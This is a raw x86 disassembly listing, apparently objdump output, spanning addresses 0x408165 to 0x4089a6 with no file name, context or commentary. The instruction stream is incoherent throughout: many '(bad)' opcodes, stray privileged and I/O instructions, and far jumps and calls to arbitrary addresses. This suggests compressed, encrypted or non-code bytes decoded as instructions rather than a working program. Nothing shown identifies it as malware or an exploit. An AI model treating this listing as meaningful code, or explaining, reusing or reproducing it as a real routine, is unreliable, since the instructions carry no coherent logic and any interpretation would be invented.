  408165:	ss (bad) 
  408167:	out    dx,eax
  408168:	sbb    al,0xde
  40816a:	fsubrp st(2),st
  40816c:	das    
  40816d:	or     al,0xbf
  40816f:	repnz adc BYTE PTR [edx+0x45e46582],dh
  408176:	mov    esp,0x5a68c4b8
  40817b:	jae    0x40815c
  40817d:	jp     0x408168
  40817f:	jne    0x4081a6
  408181:	arpl   WORD PTR [eax+0x5bf6b94c],cx
  408187:	sub    eax,0x63decd62
  40818c:	js     0x4081a1
  40818e:	pop    ss
  40818f:	push   edx
  408190:	icebp  
  408191:	mov    edi,0x439e7c5f
  408196:	mov    bh,0xf6
  408198:	loopne 0x4081ba
  40819a:	aas    
  40819b:	into   
  40819c:	adc    DWORD PTR [eax],0x2e9a4eb6
  4081a2:	or     BYTE PTR [edi],ch
  4081a4:	js     0x4081ab
  4081a6:	xchg   ebx,eax
  4081a7:	ja     0x4081f7
  4081a9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081ab:	shl    BYTE PTR [ecx+0x3776a83e],1
  4081b1:	jmp    0x4068a893
  4081b6:	lahf   
  4081b7:	jbe    0x40819b
  4081b9:	pop    ds
  4081ba:	mov    ?,WORD PTR [ebx+eiz*4-0x208c4f1]
  4081c1:	dec    ebx
  4081c2:	mov    cs,WORD PTR [esi]
  4081c4:	jge    0x408159
  4081c6:	aam    0x9
  4081c8:	out    dx,al
  4081c9:	adc    eax,0x75df5759
  4081ce:	(bad)  
  4081cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d0:	sbb    bh,BYTE PTR [edx-0x23]
  4081d3:	jg     0x40821b
  4081d5:	test   BYTE PTR [edx-0x121581b2],ah
  4081db:	dec    esi
  4081dc:	je     0x4081a7
  4081de:	xchg   ebx,eax
  4081df:	or     BYTE PTR [edx+0x5bdf1b79],bh
  4081e5:	xchg   ebx,ebx
  4081e7:	inc    esp
  4081e8:	or     esi,edx
  4081ea:	or     al,0x42
  4081ec:	push   esp
  4081ed:	jbe    0x408245
  4081ef:	lds    ebx,FWORD PTR [eax-0x742b7312]
  4081f5:	mov    ebp,0x62f42b10
  4081fa:	gs gs jne 0x408219
  4081fe:	jl     0x4081a1
  408200:	fwait
  408201:	mov    edi,0xd6fb6477
  408206:	push   eax
  408207:	retf   0x27ce
  40820a:	dec    edi
  40820b:	je     0x40828a
  40820d:	test   eax,0xd3d3931a
  408212:	push   esp
  408213:	adc    DWORD PTR [edx+0xa675ace],edi
  408219:	push   eax
  40821a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40821c:	sbb    DWORD PTR [esi+ecx*4-0x2c],eax
  408220:	loope  0x408283
  408222:	in     al,0xb4
  408224:	(bad)
  408228:	adc    edx,esi
  40822a:	or     eax,0x9c156e63
  40822f:	push   eax
  408230:	jno    0x4082a4
  408232:	sbb    bh,BYTE PTR [ebp-0x69]
  408235:	cmp    al,0x57
  408237:	call   0xc449:0x4a42781a
  40823e:	mov    ds:0x4f2f7b9f,al
  408243:	and    ecx,eax
  408245:	sbb    ebx,edx
  408247:	xor    esi,DWORD PTR [edx+0x4694f958]
  40824d:	arpl   WORD PTR [edx+edi*2],cx
  408250:	jmp    0xa590862c
  408255:	cld    
  408256:	sbb    eax,0xfd238ca6
  40825b:	cli    
  40825c:	or     bl,BYTE PTR [edi+0x7c937b56]
  408262:	dec    esi
  408263:	mov    edi,0x2a20a89e
  408268:	mov    bh,0x8c
  40826a:	(bad)  
  40826b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40826c:	pop    edi
  40826d:	pop    ecx
  40826e:	das    
  40826f:	xor    dl,BYTE PTR [edi-0x350aab15]
  408275:	ins    DWORD PTR es:[edi],dx
  408276:	clc    
  408277:	xchg   ebx,eax
  408278:	push   es
  408279:	xor    eax,0x7e26ea4f
  40827e:	ins    DWORD PTR es:[edi],dx
  40827f:	jecxz  0x4082ba
  408281:	cmc    
  408282:	cvtpi2ps xmm2,QWORD PTR [esi-0x33]
  408286:	push   edx
  408287:	cmp    BYTE PTR [ebx+0x67],cl
  40828a:	sub    bl,0x8d
  40828d:	loope  0x4082f8
  40828f:	jmp    0xe86a:0xf72683a6
  408296:	add    ch,BYTE PTR [ebx]
  408298:	popa   
  408299:	shl    BYTE PTR [edi+eiz*2+0x63e546ff],cl
  4082a0:	out    dx,al
  4082a1:	(bad)  
  4082a2:	cwde   
  4082a3:	xchg   ebp,eax
  4082a4:	sub    BYTE PTR [ebp-0x46],bl
  4082a7:	mov    esi,DWORD PTR [ecx-0x151b2385]
  4082ad:	push   ebx
  4082ae:	and    al,0x16
  4082b0:	adc    al,BYTE PTR [eax-0x72]
  4082b3:	push   ds
  4082b4:	pushf  
  4082b5:	scas   al,BYTE PTR es:[edi]
  4082b6:	sahf   
  4082b7:	xchg   ecx,eax
  4082b8:	(bad)  
  4082b9:	in     eax,0xfc
  4082bb:	jmp    0x84923b4f
  4082c0:	mov    ebp,0x39f51aae
  4082c5:	fwait
  4082c6:	repnz sbb al,0x76
  4082c9:	test   eax,0xed9a12c1
  4082ce:	in     eax,0xdc
  4082d0:	sbb    DWORD PTR [ebx+0x6],edx
  4082d3:	add    eax,0x1a26cd6e
  4082d8:	cmc    
  4082d9:	jmp    0x1c24189e
  4082de:	cwde   
  4082df:	xlat   BYTE PTR ds:[ebx]
  4082e0:	jmp    0x13d2:0xf361396b
  4082e7:	mov    ebx,0xeb65341
  4082ec:	repz inc edi
  4082ee:	adc    DWORD PTR [eax-0x3cfe49a0],esp
  4082f4:	mov    esi,0xc98adcb6
  4082f9:	mov    ds:0xa5ef94bc,eax
  4082fe:	or     ch,dl
  408300:	popa   
  408301:	bnd jge 0x40836d
  408304:	add    ecx,DWORD PTR [edi-0x62]
  408307:	cs jae 0x4082ef
  40830a:	repnz sub eax,0xf5452951
  408310:	sbb    eax,0xbed6e33e
  408315:	aas    
  408316:	pushf  
  408317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408318:	push   0xd44a8a55
  40831d:	or     DWORD PTR [eax-0x1183c97b],ebx
  408323:	ja     0x40838b
  408325:	fldcw  WORD PTR [ecx-0x1b]
  408328:	mov    dl,0xdb
  40832a:	inc    edi
  40832b:	pop    ds
  40832c:	pushf  
  40832d:	repz add dh,BYTE PTR [edx+0x4364533d]
  408334:	xor    edi,ecx
  408336:	les    eax,FWORD PTR [ebp+0x1b1cfb14]
  40833c:	pop    edi
  40833d:	ins    DWORD PTR es:[edi],dx
  40833e:	nop
  40833f:	xor    ebp,DWORD PTR [ebx-0x38]
  408342:	inc    edx
  408343:	imul   eax,DWORD PTR [ebx+0x45],0x68775876
  40834a:	pop    ss
  40834b:	mov    ch,0x4d
  40834d:	pop    esi
  40834e:	mov    bl,0x1d
  408350:	cmp    esp,edx
  408352:	push   0x42dda077
  408357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408358:	xor    esi,DWORD PTR [ebx]
  40835a:	aam    0x85
  40835c:	and    DWORD PTR [edi-0x25],0xffffffc3
  408360:	sub    ch,BYTE PTR [edi]
  408362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408363:	retf   0x3535
  408366:	leave  
  408367:	add    BYTE PTR [ebx+0x3b7af1d7],dh
  40836d:	ret    0x2ed5
  408370:	adc    bl,BYTE PTR gs:[edi]
  408373:	add    al,0x2f
  408375:	xchg   ecx,eax
  408376:	jae    0x4083e2
  408378:	aad    0xcd
  40837a:	dec    ebp
  40837b:	pop    ecx
  40837c:	add    ah,BYTE PTR ds:0x1ad22f5d
  408382:	fmul   QWORD PTR [esi+eiz*1-0x24]
  408386:	inc    eax
  408387:	xor    eax,0x5c1414ac
  40838c:	fs adc eax,0xef4671b1
  408392:	aas    
  408393:	mov    eax,0x4890245
  408398:	mov    esp,0xba4bdded
  40839d:	imul   esi,DWORD PTR [edi+0x4],0x49
  4083a1:	rcl    BYTE PTR [ebx-0x3aa39c73],1
  4083a7:	inc    ebp
  4083a8:	pop    esp
  4083a9:	cmp    esi,DWORD PTR [ecx+0x1d5ab98b]
  4083af:	and    al,BYTE PTR [edx-0x1361e410]
  4083b5:	cld    
  4083b6:	popf   
  4083b7:	in     al,0x12
  4083b9:	cmp    eax,0x6ceee552
  4083be:	mov    ah,0x1f
  4083c0:	mov    ebp,0xb583e912
  4083c5:	outs   dx,BYTE PTR ds:[esi]
  4083c6:	jmp    0x408420
  4083c8:	xchg   ecx,eax
  4083c9:	xor    BYTE PTR ds:0x9f1522ac,cl
  4083cf:	retf   
  4083d0:	aam    0xb8
  4083d2:	call   0x9aaa:0xd544bc57
  4083d9:	jo     0x4083dd
  4083db:	test   eax,0xb1386efd
  4083e0:	push   0x28
  4083e2:	test   al,0xae
  4083e4:	aam    0x97
  4083e6:	int3   
  4083e7:	inc    eax
  4083e8:	sub    al,0x46
  4083ea:	fs jb  0x40845f
  4083ed:	data16 cmp BYTE PTR [edx+0xc],ah
  4083f1:	cmc    
  4083f2:	jbe    0x408378
  4083f4:	shl    DWORD PTR [ebp+0x60],cl
  4083f7:	fild   WORD PTR [eax+ebp*2-0x1d]
  4083fb:	aas    
  4083fc:	clc    
  4083fd:	xor    esi,esi
  4083ff:	cwde   
  408400:	jne    0x4083c4
  408402:	push   ds
  408403:	ret    0xdd61
  408406:	imul   DWORD PTR [eax-0x4f]
  408409:	jo     0x40842e
  40840b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40840c:	mov    DWORD PTR [eax],eax
  40840e:	sbb    cl,BYTE PTR [esi-0x28]
  408411:	mov    ebp,0x9522c05e
  408416:	sbb    DWORD PTR [edx-0x36a08b27],ebp
  40841c:	or     dh,dl
  40841e:	scas   eax,DWORD PTR es:[edi]
  40841f:	repnz ss or al,0x71
  408423:	je     0x4083b8
  408425:	inc    edi
  408426:	push   esp
  408427:	pop    ds
  408428:	jp     0x4083ba
  40842a:	add    bl,BYTE PTR [esi+0x9ce9a8a]
  408430:	mov    dl,0x43
  408432:	sbb    dl,dl
  408434:	es sbb al,0x6a
  408437:	(bad)  
  408438:	mov    esp,0xe590a86
  40843d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40843e:	xchg   esi,eax
  40843f:	mov    BYTE PTR [ebx+0x5c],0xe8
  408443:	sbb    al,0xed
  408445:	loop   0x40844c
  408447:	retf   0xd07f
  40844a:	pusha  
  40844b:	(bad)  
  40844c:	das    
  40844d:	inc    edi
  40844e:	into   
  40844f:	dec    BYTE PTR gs:[edi+0xf]
  408453:	add    ch,BYTE PTR [ebp+0x4069a764]
  408459:	gs mov ebp,0x660ef13c
  40845f:	sbb    bh,BYTE PTR [eax-0x4703f15b]
  408465:	add    esp,esi
  408467:	push   cs
  408468:	inc    edi
  408469:	cwde   
  40846a:	add    al,0x23
  40846c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40846d:	sbb    ch,BYTE PTR [ebp-0x7a629804]
  408473:	inc    edi
  408474:	jle    0x408492
  408476:	mov    cl,cl
  408478:	and    BYTE PTR [ecx+ecx*2],ah
  40847b:	pop    ebp
  40847c:	hlt    
  40847d:	aad    0x43
  40847f:	scas   al,BYTE PTR es:[edi]
  408480:	in     al,dx
  408481:	adc    dh,bh
  408483:	fldenv [eax+0x414c322d]
  408489:	xor    al,0x1e
  40848b:	push   edi
  40848c:	pop    edi
  40848d:	cmp    BYTE PTR [edi-0x2d],bh
  408490:	test   ebp,ecx
  408492:	sbb    DWORD PTR [ebp+0x2b],edx
  408495:	lea    esp,[esi-0x28099f4b]
  40849b:	dec    edi
  40849c:	dec    ebx
  40849d:	sahf   
  40849e:	jmp    0x40843d
  4084a0:	push   0x71
  4084a2:	mov    ebx,0xdfdde4b6
  4084a7:	pop    es
  4084a8:	out    0x26,eax
  4084aa:	(bad)  
  4084ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084ac:	int3   
  4084ad:	push   ds
  4084ae:	push   ecx
  4084af:	(bad)  
  4084b0:	cmc    
  4084b1:	sub    BYTE PTR [ecx+0x51],al
  4084b4:	inc    ecx
  4084b5:	add    ebp,ebp
  4084b7:	lds    esp,FWORD PTR [edx-0x70101f36]
  4084bd:	fist   DWORD PTR [edx-0x699f7c11]
  4084c3:	out    0xec,eax
  4084c5:	lods   al,BYTE PTR ds:[esi]
  4084c6:	retf   
  4084c7:	cmp    BYTE PTR [ecx],0xad
  4084ca:	(bad)
  4084cd:	pop    eax
  4084ce:	add    eax,0xdffcd3d0
  4084d3:	popa   
  4084d4:	int    0x6
  4084d6:	xchg   ecx,eax
  4084d7:	gs stc 
  4084d9:	add    DWORD PTR [ebp-0x47875c4a],0x20
  4084e0:	lock sbb DWORD PTR [edi-0x58],edx
  4084e4:	(bad)  
  4084e5:	mov    ds:0xbd0dc6ed,al
  4084ea:	push   ebx
  4084eb:	in     eax,dx
  4084ec:	lods   eax,DWORD PTR ds:[esi]
  4084ed:	sbb    ch,ah
  4084ef:	(bad)  
  4084f0:	sar    BYTE PTR [eax+0x59],0x12
  4084f4:	push   ebp
  4084f5:	or     al,0xd4
  4084f7:	or     al,0x49
  4084f9:	pop    es
  4084fa:	pop    es
  4084fb:	shr    BYTE PTR [edx+0x60],1
  4084fe:	bound  eax,QWORD PTR [ecx+0x1e]
  408501:	lds    esp,FWORD PTR [ecx]
  408503:	aas    
  408504:	shl    BYTE PTR [edx+0x453a2c94],1
  40850a:	pop    ss
  40850b:	rcl    BYTE PTR [ebp-0x392f5c2f],cl
  408511:	hlt    
  408512:	adc    eax,0x467bf446
  408517:	scas   eax,DWORD PTR es:[edi]
  408518:	push   edi
  408519:	call   0xe7a6:0x9faabf01
  408520:	mov    esp,0xa3d6181
  408525:	sbb    al,0xe8
  408527:	inc    DWORD PTR [ecx]
  408529:	pop    ss
  40852a:	(bad)  
  40852c:	data16 test al,0xe0
  40852f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408530:	(bad)  
  408531:	jp     0x408535
  408533:	push   es
  408534:	jb     0x408501
  408536:	aam    0xc8
  408538:	into   
  408539:	mov    ebx,0x9ea9de1
  40853e:	fcomp  QWORD PTR cs:[ebp+0x38793514]
  408545:	sub    eax,0x7cd31bb2
  40854a:	sbb    BYTE PTR ds:0xa028bb6a,al
  408550:	call   0x7a6796c4
  408555:	dec    ebx
  408556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408557:	es mov edx,ebp
  40855a:	pop    esp
  40855b:	pushf  
  40855c:	fild   WORD PTR [eax-0x1a]
  40855f:	popf   
  408560:	lahf   
  408561:	stc    
  408562:	cmp    BYTE PTR [ebx],ah
  408564:	repnz imul esp,DWORD PTR [ebx-0x23687e32],0xffffff86
  40856c:	jp     0x40857d
  40856e:	mov    ebp,0xd28b09e3
  408573:	adc    eax,ecx
  408575:	cld    
  408576:	mov    esi,0xd37c7d57
  40857b:	pop    edx
  40857c:	inc    BYTE PTR [edx-0x68e12b38]
  408582:	lods   al,BYTE PTR ds:[esi]
  408583:	adc    eax,0xf08585fa
  408588:	sbb    BYTE PTR [esi-0x67f8ed2d],al
  40858e:	and    ah,BYTE PTR [ecx-0x26]
  408591:	in     al,0xf1
  408593:	test   eax,0x49c914a0
  408598:	jecxz  0x4085b7
  40859a:	cmc    
  40859b:	rcr    BYTE PTR cs:0x79d05f04,0x7
  4085a3:	cdq    
  4085a4:	sar    DWORD PTR [edx],1
  4085a6:	add    BYTE PTR [ebx+0x24],dh
  4085a9:	push   ebp
  4085aa:	outs   dx,BYTE PTR ds:[esi]
  4085ab:	ficom  DWORD PTR [eax+eiz*4]
  4085ae:	xor    eax,0x17ee2ade
  4085b3:	not    ebx
  4085b5:	and    BYTE PTR [ebp-0x5c],ah
  4085b8:	out    0xee,eax
  4085ba:	retf   0xed71
  4085bd:	cmp    DWORD PTR [ecx],edi
  4085bf:	push   ds
  4085c0:	pop    DWORD PTR ds:0xf0cd3240
  4085c6:	adc    DWORD PTR [ebp-0x57],ebp
  4085c9:	cmp    BYTE PTR [ecx],al
  4085cb:	ins    BYTE PTR es:[edi],dx
  4085cc:	sbb    BYTE PTR [esi-0x61fc72b0],ch
  4085d2:	adc    edi,esi
  4085d4:	cmp    eax,0x7e697d22
  4085d9:	jbe    0x408607
  4085db:	jle    0x408570
  4085dd:	retf   
  4085de:	pop    edi
  4085df:	adc    DWORD PTR [eax+0x4c69932f],0xa243a940
  4085e9:	das    
  4085ea:	xchg   ebx,eax
  4085eb:	add    ebx,DWORD PTR [edx-0x4e]
  4085ee:	lea    ebp,[ebp-0x2d691990]
  4085f4:	mov    bl,0x48
  4085f6:	sbb    edx,DWORD PTR [edi]
  4085f8:	pop    ebx
  4085f9:	repnz les eax,FWORD PTR [eax+0x13]
  4085fd:	(bad)  
  4085fe:	pop    ebx
  4085ff:	jmp    0xe836:0x9efa7b45
  408606:	aam    0x4
  408608:	js     0x4085a6
  40860a:	add    edx,edx
  40860c:	clc    
  40860d:	jmp    0xd9f1:0xc61296c3
  408614:	cld    
  408615:	mov    ebx,0xb65476a
  40861a:	ret    0x63e9
  40861d:	enter  0xf6fe,0x93
  408621:	mov    bh,0x2a
  408623:	or     ecx,DWORD PTR [edx-0xfe1e69d]
  408629:	pop    esi
  40862a:	jle    0x408654
  40862c:	cli    
  40862d:	adc    ebp,DWORD PTR [ebx]
  40862f:	mov    DWORD PTR [ebx],ebp
  408631:	cmp    DWORD PTR [esi-0x39],ebp
  408634:	or     eax,0xea2e526b
  408639:	push   es
  40863a:	nop
  40863b:	das    
  40863c:	es mov ecx,0xe345c1f1
  408642:	inc    edi
  408643:	jne    0x408610
  408645:	pop    ebx
  408646:	xor    DWORD PTR [ebx],eax
  408648:	adc    eax,0xc060852e
  40864d:	sub    bl,0xa1
  408650:	pushf  
  408651:	je     0x4085f3
  408653:	inc    ecx
  408654:	lock (bad) 
  408656:	fnstenv [ebx-0x65e128f2]
  40865c:	push   ebp
  40865d:	mov    al,ds:0xcab05144
  408662:	fwait
  408663:	and    al,0x6d
  408665:	inc    ebp
  408666:	or     BYTE PTR [edx],bh
  408668:	mov    ecx,0x3bbbb0bb
  40866d:	pop    edx
  40866e:	adc    ch,BYTE PTR [eax-0x8]
  408671:	dec    eax
  408672:	in     eax,0x4e
  408674:	lahf   
  408675:	inc    ebp
  408676:	xchg   ebp,eax
  408677:	adc    al,0x4f
  408679:	dec    edx
  40867a:	adc    al,0x82
  40867c:	imul   WORD PTR [ebx-0x14]
  408680:	and    ah,BYTE PTR cs:[eax+ecx*4+0x618ed09]
  408688:	ret    0x9a1d
  40868b:	ror    ebp,1
  40868d:	pop    edi
  40868e:	dec    esp
  40868f:	cmc    
  408690:	call   0xfa66238e
  408695:	inc    ebp
  408696:	cmp    al,0x1b
  408698:	loope  0x4086d6
  40869a:	or     BYTE PTR [edi+0x0],bl
  40869d:	dec    ebx
  40869f:	ja     0x4086c7
  4086a1:	into   
  4086a2:	xor    eax,0x89899f32
  4086a7:	xor    al,0x2f
  4086a9:	inc    esi
  4086aa:	mov    ebp,esp
  4086ac:	je     0x408668
  4086ae:	clc    
  4086af:	inc    edi
  4086b0:	push   eax
  4086b1:	in     eax,0x6a
  4086b3:	or     bh,ch
  4086b5:	mov    ebx,DWORD PTR [edi+0x1b]
  4086b8:	ror    BYTE PTR [ebp+0x38c11a92],cl
  4086be:	jg     0x40868e
  4086c0:	stos   BYTE PTR es:[edi],al
  4086c1:	mov    eax,ds:0xf17c6297
  4086c6:	fidiv  DWORD PTR [ebp-0x703b230f]
  4086cc:	es pop esi
  4086ce:	inc    eax
  4086cf:	(bad)  
  4086d0:	or     al,0x9c
  4086d2:	jle    0x40873a
  4086d4:	inc    ebx
  4086d5:	xchg   esi,eax
  4086d6:	mov    ebp,0x242ec99a
  4086db:	cli    
  4086dc:	cmp    eax,0xa312ac32
  4086e1:	(bad)  
  4086e2:	cmp    DWORD PTR [esi-0x60017aa4],eax
  4086e8:	sub    al,0x2b
  4086ea:	push   ss
  4086eb:	ret    0x7ae3
  4086ee:	int    0x3e
  4086f0:	cmp    edi,ebp
  4086f2:	loopne 0x40870e
  4086f4:	sbb    al,0xad
  4086f6:	dec    ecx
  4086f7:	test   BYTE PTR [ecx+edx*4],bl
  4086fa:	mov    DWORD PTR [edi],0xdf11f245
  408700:	nop
  408701:	aam    0x23
  408703:	cmc    
  408704:	or     BYTE PTR [esi+0x9],0xb9
  408708:	pop    ss
  408709:	adc    DWORD PTR [esi+ebp*4],0x10
  40870d:	mov    ds:0x111e053f,al
  408712:	xor    dl,BYTE PTR [ebp-0x99ed34d]
  408718:	jp     0x40873d
  40871a:	(bad)  
  40871b:	loopne 0x4086e9
  40871d:	test   BYTE PTR ds:0xd4c848b2,ch
  408723:	fcomp  DWORD PTR [esi-0x36992e6]
  408729:	and    eax,0x7fe5bf92
  40872e:	out    dx,al
  40872f:	jmp    0xd727ccd7
  408734:	push   0x7c9da1e
  408739:	(bad)  
  40873a:	sub    al,0xec
  40873c:	pop    edi
  40873d:	popf   
  40873e:	pop    ss
  40873f:	pop    ds
  408740:	pop    es
  408741:	mov    BYTE PTR [esi],bl
  408743:	das    
  408744:	and    DWORD PTR [esi],edx
  408746:	xchg   dl,cl
  408748:	sub    ah,BYTE PTR es:[ecx-0x1]
  40874c:	pop    DWORD PTR [edi+0x5c]
  40874f:	push   edx
  408750:	lods   al,BYTE PTR ds:[esi]
  408751:	add    BYTE PTR [ecx-0x1740ef88],al
  408757:	gs mov al,0xb7
  40875a:	xchg   ecx,eax
  40875b:	jne    0x40877f
  40875d:	inc    eax
  40875e:	icebp  
  40875f:	push   ebp
  408760:	and    DWORD PTR [edx-0x18db817e],0x64a698e1
  40876a:	scas   al,BYTE PTR es:[edi]
  40876b:	push   0x43cc017a
  408770:	add    BYTE PTR [esi],al
  408772:	jnp    0x408739
  408774:	iret   
  408775:	es mov ebp,0x8ba4ef60
  40877b:	jp     0x4087cc
  40877d:	push   eax
  40877e:	cmp    BYTE PTR [edx+0x2b53823e],cl
  408784:	rcl    BYTE PTR [ecx+ebx*4+0x3fb49682],0x4d
  40878c:	ret    0xa74b
  40878f:	lahf   
  408790:	mov    al,0x12
  408792:	stos   BYTE PTR es:[edi],al
  408793:	sbb    BYTE PTR [edx+0x2],0x17
  408797:	jno    0x40876d
  408799:	(bad)  
  40879a:	std    
  40879b:	adc    BYTE PTR [esi],ah
  40879d:	test   eax,0x822c142f
  4087a2:	cmp    eax,0xe156a91
  4087a7:	xor    eax,0xe8bc89c3
  4087ac:	inc    ebx
  4087ad:	xlat   BYTE PTR ds:[ebx]
  4087ae:	mov    esi,0xbe099e4f
  4087b3:	sub    al,BYTE PTR [edi+0xa]
  4087b6:	pop    ecx
  4087b7:	pushf  
  4087b8:	std    
  4087b9:	xchg   ecx,eax
  4087ba:	sub    eax,0xf5fcc40d
  4087bf:	xchg   ebp,eax
  4087c0:	in     al,0x81
  4087c2:	je     0x40876e
  4087c4:	aam    0x64
  4087c6:	pop    ebx
  4087c7:	and    al,0xf9
  4087c9:	xchg   esi,eax
  4087ca:	mov    ebp,0x787fce24
  4087cf:	sub    BYTE PTR [ebp+edx*1-0x6fc4b154],0xbc
  4087d7:	cdq    
  4087d8:	mov    cl,0xf5
  4087da:	xor    BYTE PTR [ecx],bl
  4087dc:	popf   
  4087dd:	std    
  4087de:	cmp    DWORD PTR [ebx-0x5c140786],ebx
  4087e4:	cld    
  4087e5:	push   ds
  4087e6:	test   eax,0xf04b56e5
  4087eb:	cs iret 
  4087ed:	lds    ecx,FWORD PTR [ecx-0x1c2dd781]
  4087f3:	ficom  WORD PTR [eax]
  4087f5:	mov    ebp,0x1804ce06
  4087fa:	mov    esi,DWORD PTR [eax+0xb]
  4087fd:	lahf   
  4087fe:	aad    0x4e
  408800:	lock mov ecx,0xa1ca6325
  408806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408807:	and    al,0xe0
  408809:	sbb    ah,cl
  40880b:	loope  0x408838
  40880d:	test   al,0xb1
  40880f:	data16 icebp 
  408811:	ins    BYTE PTR es:[edi],dx
  408812:	pusha  
  408813:	call   0x5695c762
  408818:	shl    BYTE PTR cs:[edi-0x7d2a6573],0x67
  408820:	popf   
  408821:	popf   
  408822:	lods   al,BYTE PTR ds:[esi]
  408823:	push   ebx
  408824:	stos   DWORD PTR es:[edi],eax
  408825:	jb     0x40885b
  408827:	mov    BYTE PTR [esi],0x1f
  40882a:	fst    QWORD PTR [edx]
  40882c:	and    DWORD PTR [edx-0x6030c388],edi
  408832:	das    
  408833:	push   cs
  408834:	and    ebp,DWORD PTR [ebp-0x6e47ec0e]
  40883a:	and    ah,BYTE PTR [edi+0xb30c2c3]
  408840:	and    eax,0xeef39229
  408845:	icebp  
  408846:	popa   
  408847:	rdtsc  
  408849:	fcom   QWORD PTR [ebx+0x44df28d9]
  40884f:	jle    0x40882b
  408851:	add    ebx,DWORD PTR [ecx+0x79]
  408854:	cwde   
  408855:	mov    ds:0x2bf54f4f,al
  40885a:	mov    ds:0x52299478,eax
  40885f:	in     eax,0xd9
  408861:	(bad)  
  408863:	jmp    0x158a:0x9621c71f
  40886a:	and    bh,BYTE PTR [eax-0x78137e62]
  408870:	dec    ebp
  408871:	cmp    esi,edi
  408873:	add    eax,0x50b70680
  408878:	mov    dl,0xc6
  40887a:	cmp    DWORD PTR [ebx],0xffffffef
  40887d:	out    0x7e,eax
  40887f:	(bad)  
  408880:	gs aas 
  408882:	addr16 mov esp,0x8f1638a2
  408888:	stc    
  408889:	and    al,0x8e
  40888b:	in     eax,dx
  40888c:	mov    BYTE PTR gs:[edi],bl
  40888f:	ins    DWORD PTR es:[edi],dx
  408890:	repnz fsub QWORD PTR [ebx-0x35]
  408894:	sbb    DWORD PTR [edx+0x359bffd6],edx
  40889a:	pop    ebx
  40889b:	retf   0x5bcf
  40889e:	daa    
  40889f:	scas   al,BYTE PTR es:[edi]
  4088a0:	cli    
  4088a1:	in     eax,0x66
  4088a3:	pop    edx
  4088a4:	fmulp  st(2),st
  4088a6:	imul   ecx
  4088a8:	push   0x1b
  4088aa:	daa    
  4088ab:	arpl   cx,di
  4088ad:	pop    edx
  4088ae:	adc    eax,0x542459eb
  4088b3:	adc    ecx,ebp
  4088b5:	jmp    0x6bef5065
  4088ba:	sti    
  4088bb:	je     0x4088f0
  4088bd:	mov    es,WORD PTR [esi-0x7e6e996c]
  4088c3:	mov    esi,0x63d6e74e
  4088c8:	and    eax,DWORD PTR [eax]
  4088ca:	pop    ebx
  4088cb:	out    0xe8,eax
  4088cd:	stos   BYTE PTR es:[edi],al
  4088ce:	xchg   DWORD PTR [edi],edi
  4088d0:	mov    dl,0x36
  4088d2:	adc    BYTE PTR [ebx+edx*2],0xc9
  4088d6:	adc    eax,DWORD PTR [eax]
  4088d8:	(bad)  
  4088d9:	jno    0x40892e
  4088db:	rol    DWORD PTR [edi+0x73],1
  4088de:	inc    esi
  4088df:	mov    edx,0x8b03b9e7
  4088e4:	mov    DWORD PTR ds:0x53fbff3d,esp
  4088ea:	mov    ds:0x55139ac6,eax
  4088ef:	mov    ds:0xf6a2e4a,al
  4088f4:	call   FWORD PTR [edi-0x393b390c]
  4088fa:	inc    ecx
  4088fb:	or     BYTE PTR ds:0x3ad30206,ch
  408901:	xor    eax,0xde5f125f
  408906:	adc    ebp,DWORD PTR [esi]
  408908:	fidiv  WORD PTR [ebx]
  40890a:	int3   
  40890b:	lods   al,BYTE PTR ds:[esi]
  40890c:	iret   
  40890d:	repz (bad) 
  408910:	gs ds std 
  408913:	je     0x40889f
  408915:	jmp    0xf9bc:0xe2a9b92
  40891c:	mov    ?,ecx
  40891e:	(bad)  
  40891f:	sti    
  408920:	mov    eax,ds:0xee64e4e7
  408925:	jp     0x4088ec
  408927:	add    eax,esp
  408929:	and    esi,edi
  40892b:	fwait
  40892c:	icebp  
  40892d:	lea    ebp,[ecx]
  40892f:	(bad)  
  408930:	cmp    BYTE PTR [ebp-0x27],bh
  408933:	ficom  WORD PTR [edx]
  408935:	hlt    
  408936:	cmc    
  408937:	fistp  QWORD PTR [ebx+0x77]
  40893a:	ja     0x408947
  40893c:	data16 jle 0x408942
  40893f:	stc    
  408940:	or     BYTE PTR [esi-0x171ee56c],0x8
  408947:	bound  eax,QWORD PTR [ecx+0x64dc0d4f]
  40894d:	mov    ecx,0x40a11349
  408952:	push   esi
  408953:	adc    ebp,esp
  408955:	jp     0x4088ec
  408957:	out    dx,al
  408958:	shl    BYTE PTR [ebp-0x7d9f5173],0x75
  40895f:	mov    ch,0x82
  408961:	dec    edx
  408963:	retf   0x9898
  408966:	jmp    0x40898c
  408968:	push   eax
  408969:	ret    
  40896a:	mul    ch
  40896c:	(bad)  
  40896d:	push   0xffffff94
  40896f:	mov    bh,0x3a
  408971:	and    edx,0x5bad8d8d
  408977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408978:	push   edx
  408979:	popf   
  40897a:	push   esi
  40897b:	pop    edi
  40897c:	sub    ecx,esp
  40897e:	sub    edx,DWORD PTR [edx]
  408980:	out    0xc1,al
  408982:	nop
  408983:	or     ebp,esp
  408985:	je     0x408940
  408987:	add    dh,BYTE PTR [edx+edx*8]
  40898a:	leave  
  40898b:	xchg   edx,eax
  40898c:	int3   
  40898d:	dec    edx
  40898e:	les    esp,FWORD PTR [eax]
  408990:	xchg   ebp,eax
  408991:	sbb    BYTE PTR [edi+0x2f1340c2],bl
  408997:	out    dx,eax
  408998:	xor    eax,ecx
  40899a:	ret    
  40899b:	push   esp
  40899c:	jne    0x4089ca
  40899e:	inc    ecx
  40899f:	aad    0xdd
  4089a1:	xor    eax,0x5a1c1f92
  4089a6:	sbb    DWORD PTR [esi],ebp
